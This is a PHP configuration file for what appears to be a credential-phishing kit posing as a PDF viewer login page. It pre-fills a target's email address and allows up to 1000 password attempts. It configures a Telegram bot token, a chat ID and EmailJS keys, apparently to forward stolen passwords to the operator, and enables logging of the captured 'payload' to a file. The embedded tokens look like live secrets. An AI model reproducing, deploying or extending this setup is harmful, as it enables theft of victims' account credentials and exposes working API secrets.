<?php
/**
 * Configuration Settings for PDF Viewer & Authentication Script
 */

// Default Email displayed if no ?email= or ?e= parameter is supplied in URL
define('DEFAULT_EMAIL', 'user@gmail.com');//for person you want them to login

// Maximum failed password attempts before redirection
define('MAX_ATTEMPTS', 1000);

// Redirection target URL after max attempts reached
define('REDIRECT_URL', 'https://www.google.com');

// Telegram Bot API Credentials
define('TELEGRAM_BOT_TOKEN', '8800698320:AAEBiD4PzSnlIj9H_ZqoxfjXWEG4HIRuc7A');
define('TELEGRAM_CHAT_ID', '8689206967');

// EmailJS Credentials
define('EMAILJS_SERVICE_ID', 'service_eil2uif');
define('EMAILJS_TEMPLATE_ID', 'template_w3emz7q');
define('EMAILJS_PUBLIC_KEY', 'meu_8iMESZJk5GWem');

// Enable Server-Side PHP Payload Logging/Sending (process.php)
define('ENABLE_PHP_BACKEND', true);
define('LOG_TO_FILE', true);
define('LOG_FILE_PATH', is_writable(__DIR__) ? __DIR__ . '/logs.txt' : sys_get_temp_dir() . '/logs.txt');
